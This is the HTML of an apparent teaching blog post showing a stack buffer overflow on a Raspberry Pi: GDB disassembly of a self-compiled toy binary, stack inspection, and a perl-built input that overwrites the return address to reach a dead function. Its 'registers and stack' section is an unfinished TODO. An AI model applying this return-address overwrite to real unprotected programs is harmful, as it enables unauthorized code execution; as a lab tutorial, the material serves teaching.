@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Buffer overflow on ARM architecture - Pascal Cotret @ ENSTA Bretagne</title>
+        <meta name="Description" content="Pascal Cotret @ ENSTA Bretagne"><meta property="og:title" content="Buffer overflow on ARM architecture" />
+<meta property="og:description" content="Prerequisites  A RaspberryPi and a distro. For this tutorial, I had an up-to-date Raspbian Stretch Lite with LXDE. GCC and GDB.  ARM registers and stack TODO
+An example of buffer overflow Initial state  We have a binary without its source code but compiled with debug information. We know how to use it: ./prog2 PASS where PASS is a 4-character string. We would like to know if there&rsquo;s interesting stuff or even dead code in it." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://pcotret.github.io/buffer-overflow-raspberrypi/" />
+<meta property="article:published_time" content="2020-01-01T00:00:00+08:00" />
+<meta property="article:modified_time" content="2020-05-02T00:10:21+02:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Buffer overflow on ARM architecture"/>
+<meta name="twitter:description" content="Prerequisites  A RaspberryPi and a distro. For this tutorial, I had an up-to-date Raspbian Stretch Lite with LXDE. GCC and GDB.  ARM registers and stack TODO
+An example of buffer overflow Initial state  We have a binary without its source code but compiled with debug information. We know how to use it: ./prog2 PASS where PASS is a 4-character string. We would like to know if there&rsquo;s interesting stuff or even dead code in it."/>
+<meta name="application-name" content="Pascal Cotret @ ENSTA Bretagne">
+<meta name="apple-mobile-web-app-title" content="Pascal Cotret @ ENSTA Bretagne"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://pcotret.github.io/buffer-overflow-raspberrypi/" /><link rel="prev" href="https://pcotret.github.io/pcb-maison/" /><link rel="next" href="https://pcotret.github.io/aircrack-101/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Buffer overflow on ARM architecture",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/pcotret.github.io\/buffer-overflow-raspberrypi\/"
+        },"image": {
+                "@type": "ImageObject",
+                "url": "https:\/\/pcotret.github.io\/cover.png",
+                "width":  800 ,
+                "height":  600 
+            },"genre": "posts","keywords": "buffer, raspberry, overflow","wordcount":  916 ,
+        "url": "https:\/\/pcotret.github.io\/buffer-overflow-raspberrypi\/","datePublished": "2020-01-01T00:00:00+08:00","dateModified": "2020-05-02T00:10:21+02:00","publisher": {
+                "@type": "Organization",
+                "name": "xxxx",
+                "logo": {
+                "@type": "ImageObject",
+                "url": "https:\/\/pcotret.github.io\/logo.png",
+                "width":  127 ,
+                "height":  40 
+                }
+            },"author": {
+                "@type": "Person",
+                "name": "Pascal"
+            },"description": ""
+    }
+    </script></head>
+    <body><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Pascal Cotret @ ENSTA Bretagne">Pascal Cotret @ ENSTA Bretagne</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/talks/"> Talks </a><a class="menu-item" href="/categories/articles/"> Articles </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Pascal Cotret @ ENSTA Bretagne">Pascal Cotret @ ENSTA Bretagne</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/talks/" title="">Talks</a><a class="menu-item" href="/categories/articles/" title="">Articles</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Buffer overflow on ARM architecture</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Pascal</a></span>&nbsp;
+                    <span class="post-category">included in<a href="/categories/tech-embedded/">
+                                <i class="far fa-folder fa-fw"></i>Tech notes / Embedded
+                            </a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i><time datetime=2020-01-01>2020-01-01</time>&nbsp;
+                <i class="fas fa-pencil-alt fa-fw"></i>about 916 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>5 min&nbsp;</div>
+        </div><div class="details toc" id="toc-static">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#prerequisites">Prerequisites</a></li>
+    <li><a href="#arm-registers-and-stack">ARM registers and stack</a></li>
+    <li><a href="#an-example-of-buffer-overflow">An example of buffer overflow</a>
+      <ul>
+        <li><a href="#initial-state">Initial state</a></li>
+        <li><a href="#playground">Playground</a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="prerequisites">Prerequisites</h2>
+<ul>
+<li>A RaspberryPi and a distro. For this tutorial, I had an up-to-date Raspbian Stretch Lite with LXDE.</li>
+<li>GCC and GDB.</li>
+</ul>
+<h2 id="arm-registers-and-stack">ARM registers and stack</h2>
+<p>TODO</p>
+<h2 id="an-example-of-buffer-overflow">An example of buffer overflow</h2>
+<h3 id="initial-state">Initial state</h3>
+<ul>
+<li>We have a binary without its source code but compiled with debug information.</li>
+<li>We know how to use it: <code>./prog2 PASS</code> where <code>PASS</code> is a 4-character string.</li>
+<li>We would like to know if there&rsquo;s interesting stuff or even dead code in it.</li>
+</ul>
+<h3 id="playground">Playground</h3>
+<p>Run GDB:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">gdb prog2
+</code></pre></td></tr></table>
+</div>
+</div><p>What we can disassemble with GDB:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) disassemble
+/usr/include/arm-linux-gnueabihf/bits/sys_errlist.h  __gmon_start__                                       frame_dummy
+/usr/include/arm-linux-gnueabihf/bits/types.h        __gmon_start__@plt                                   int
+/usr/include/libio.h                                 __init_array_end                                     long int
+/usr/include/stdio.h                                 __init_array_start                                   long long int
+/usr/lib/gcc/arm-linux-gnueabihf/6/include/stddef.h  __libc_csu_fini                                      long long unsigned int
+_DYNAMIC                                             __libc_csu_init                                      long unsigned int
+_GLOBAL_OFFSET_TABLE_                                __libc_start_main                                    main
+_IO_2_1_stderr_                                      __libc_start_main@plt                                prog2.c
+_IO_2_1_stdin_                                       __off64_t                                            puts
+_IO_2_1_stdout_                                      __off_t                                              puts@plt
+_IO_FILE                                             __quad_t                                             register_tm_clones
+_IO_lock_t                                           _bss_end__                                           short int
+_IO_marker                                           _edata                                               short unsigned int
+_IO_stdin_used                                       _end                                                 signed char
+__FRAME_END__                                        _fini                                                size_t
+__JCR_END__                                          _init                                                sizetype
+__JCR_LIST__                                         _start                                               stderr
+__TMC_END__                                          abort                                                stdin
+__bss_end__                                          abort@plt                                            stdout
+__bss_start                                          call_weak_fn                                         strcpy
+__bss_start__                                        char                                                 strcpy@plt
+__data_start                                         completed                                            sys_errlist
+__do_global_dtors_aux                                data_start                                           sys_nerr
+__do_global_dtors_aux_fini_array_entry               deregister_tm_clones                                 unsigned char
+__dso_handle                                         dont_touch_this                                      unsigned int
+__end__                                              exit
+__frame_dummy_init_array_entry                       exit@plt
+</code></pre></td></tr></table>
+</div>
+</div><p>Lots of stuff there&hellip; We can find at least two interesting:</p>
+<ul>
+<li><code>main</code></li>
+<li><code>dont_touch_this</code>. Yes, I compiled the code myself for this tutorial. Of course, you should not name critical code like this!</li>
+</ul>
+<p>Let&rsquo;s disassemble the main function</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) disassemble main
+Dump of assembler code for function main:
+   0x000104b8 &lt;+0&gt;:     push    {r11, lr}
+   0x000104bc &lt;+4&gt;:     add     r11, sp, #4
+   0x000104c0 &lt;+8&gt;:     sub     sp, sp, #16
+   0x000104c4 &lt;+12&gt;:    str     r0, [r11, #-16]
+   0x000104c8 &lt;+16&gt;:    str     r1, [r11, #-20] ; 0xffffffec
+   0x000104cc &lt;+20&gt;:    ldr     r3, [r11, #-20] ; 0xffffffec
+   0x000104d0 &lt;+24&gt;:    add     r3, r3, #4
+   0x000104d4 &lt;+28&gt;:    ldr     r2, [r3]
+   0x000104d8 &lt;+32&gt;:    sub     r3, r11, #8
+   0x000104dc &lt;+36&gt;:    mov     r1, r2
+   0x000104e0 &lt;+40&gt;:    mov     r0, r3
+   0x000104e4 &lt;+44&gt;:    bl      0x1032c &lt;strcpy@plt&gt;
+   0x000104e8 &lt;+48&gt;:    mov     r3, #0
+   0x000104ec &lt;+52&gt;:    mov     r0, r3
+   0x000104f0 &lt;+56&gt;:    sub     sp, r11, #4
+   0x000104f4 &lt;+60&gt;:    pop     {r11, pc}
+End of assembler dump.
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>No call to <code>dont_touch_this</code>. It means this is a dead code section. Why?</li>
+<li>Oh, <code>strcpy</code>! We found a breach! This functions must not be used nowadays as it doesn&rsquo;t check buffer length (<a href="https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml)">https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml)</a>. We should try a buffer overflow at this line.</li>
+</ul>
+<p>If we disassemble <code>dont_touch_this</code>, we can get the entry point of this function (address <code>0x0001049c</code>):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) disassemble dont_touch_this
+Dump of assembler code for function dont_touch_this:
+   0x0001049c &lt;+0&gt;:     push    {r11, lr}
+   0x000104a0 &lt;+4&gt;:     add     r11, sp, #4
+   0x000104a4 &lt;+8&gt;:     ldr     r0, [pc, #8]    ; 0x104b4 &lt;dont_touch_this+24&gt;
+   0x000104a8 &lt;+12&gt;:    bl      0x10338 &lt;puts@plt&gt;
+   0x000104ac &lt;+16&gt;:    mov     r0, #0
+   0x000104b0 &lt;+20&gt;:    bl      0x1035c &lt;exit@plt&gt;
+   0x000104b4 &lt;+24&gt;:    andeq   r0, r1, r8, ror #10
+End of assembler dump.
+</code></pre></td></tr></table>
+</div>
+</div><p>Putting a breakpoint right after the <code>strcpy</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) break *0x000104e8
+Breakpoint 1 at 0x104e8: file prog2.c, line 14.
+</code></pre></td></tr></table>
+</div>
+</div><p>Running the program with valid input and checking registers and stack values:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) run AAAA
+Starting program: /home/pi/Documents/tutorial/prog2 AAAA
+Breakpoint 1, main (argc=2, argv=0x7efff684) at prog2.c:14
+14          return 0;
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) info registers
+r0             0x7efff524       2130703652
+r1             0x7efff7d7       2130704343
+r2             0x0      0
+r3             0x9      9
+r4             0x104f8  66808
+r5             0x0      0
+r6             0x10374  66420
+r7             0x0      0
+r8             0x0      0
+r9             0x0      0
+r10            0x76fff000       1996484608
+r11            0x7efff52c       2130703660
+r12            0x7efff524       2130703652
+sp             0x7efff518       0x7efff518
+lr             0x104e8  66792
+pc             0x104e8  0x104e8 &lt;main+48&gt;
+cpsr           0x20000010       536870928
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) x/16x $sp
+0x7efff518:     0x7efff684      0x00000002      0x00000000      0x41414141
+0x7efff528:     0x00000000      0x76e80678      0x76fa5000      0x7efff684
+0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
+0x7efff548:     0xf35a2f10      0xfb4ddc14      0x000104f8      0x00000000
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>In the stack, we can see our <code>AAAA</code> as <code>0x41414141</code> (ASCII codes, little-endian).</li>
+<li><code>0x76e80678</code> is the return address.</li>
+</ul>
+<p>Same thing with longer input:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) run ABCDABCD
+Starting program: /home/pi/Documents/tutorial/prog2 ABCDABCD
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) x/16x $sp
+0x7efff518:     0x7efff684      0x00000002      0x00000000      0x44434241
+0x7efff528:     0x44434241      0x76e80600      0x76fa5000      0x7efff684
+0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
+0x7efff548:     0xc9cf5894      0xc1d8ab90      0x000104f8      0x00000000
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>As expected, we find the <code>0x44434241</code> twice (corresponds to <code>DCBA</code>).</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x76e80600 in __libc_start_main (main=0x7efff684, argc=1996115968, argv=0x76e80600 &lt;__libc_start_main+156&gt;, init=0x104f8 &lt;__libc_csu_init&gt;,
+    fini=0x10558 &lt;__libc_csu_fini&gt;, rtld_fini=0x76fdf9b8 &lt;_dl_fini&gt;, stack_end=0x7efff684) at libc-start.c:247
+247     libc-start.c: No such file or directory.
+</code></pre></td></tr></table>
+</div>
+</div><p>If we continue the program execution, we see a segfault while the return address is <code>0x76e80600</code>..
+There&rsquo;s already a buffer overflow here. However, it would be useful to redirect it to the <code>dont_touch_this</code> method to see what&rsquo;s in there.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">pi@raspberrypi:~/Documents/tutorial $ ./prog2 <span class="k">$(</span>perl -e <span class="s1">&#39;print &#34;ABCDABCD\x9c\x04\x01&#34;;&#39;</span><span class="k">)</span>
+The master key is 0xDEADBEEF
+</code></pre></td></tr></table>
+</div>
+</div><p>YES! We entered the dead code and found a master key 😈</p>
+<ul>
+<li><code>ABCDABCD</code> to fill the stack with some bytes (it could be anything).</li>
+<li>The next 3 bytes are the entry point of <code>dont_touch_this</code> in little endian (see GDB output).</li>
+<li>I was lucky because this binary was compiled without stack protection. It seems a bit crazy but, on a default Raspbian distro, the <code>fstack-protector</code> flag is not enabled&hellip;</li>
+</ul>
+<p>If I tried my buffer overflow attack when the binary has been compiled with the stack protector, I would get the following message:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">*** stack smashing detected ***: ./prog2 terminated
+Aborted__
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="references">References</h2>
+<p><a href="https://www.merckedsecurity.com/blog/smashing-the-arm-stack-part-1">https://www.merckedsecurity.com/blog/smashing-the-arm-stack-part-1</a></p>
+<p><a href="http://billyellis.net/">http://billyellis.net/</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>The article was updated on 2020-05-02&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/a07d048dc0f05aea370e5abec2301f999cd868cc" target="_blank" title="commit by Pascal(pascal@ensta-laptop) a07d048dc0f05aea370e5abec2301f999cd868cc: Refonte">
+                                <i class="fas fa-hashtag fa-fw"></i>a07d048</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/buffer-overflow-raspberrypi/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/buffer/">buffer</a>,&nbsp;<a href="/tags/raspberry/">raspberry</a>,&nbsp;<a href="/tags/overflow/">overflow</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/pcb-maison/" class="prev" rel="prev" title="Comment faire des PCB avec des produits basiques"><i class="fas fa-angle-left fa-fw"></i>Comment faire des PCB avec des produits basiques</a>
+            <a href="/aircrack-101/" class="next" rel="next" title="Aircrack 101 - How to get the password of a WEP/WPA2 session captured in Wireshark">Aircrack 101 - How to get the password of a WEP/WPA2 session captured in Wireshark<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><style>.lg-toolbar .lg-icon::after { color: #999; }</style><script type="text/javascript">
+    window.config = {"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"headerMode":{"desktop":"fixed","mobile":"auto"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","noResultsFound":"No results found","type":"algolia"}};
+</script><script type="text/javascript" src="https://polyfill.io/v3/polyfill.min.js?features=Element.prototype.closest%2CrequestAnimationFrame%2CCustomEvent%2CPromise%2CObject.entries%2CObject.assign%2CObject.values%2Cfetch%2CElement.prototype.after%2CArray.prototype.fill%2CIntersectionObserver%2CArray.from%2CArray.prototype.find%2CMath.sign"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/object-fit-images/ofi.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
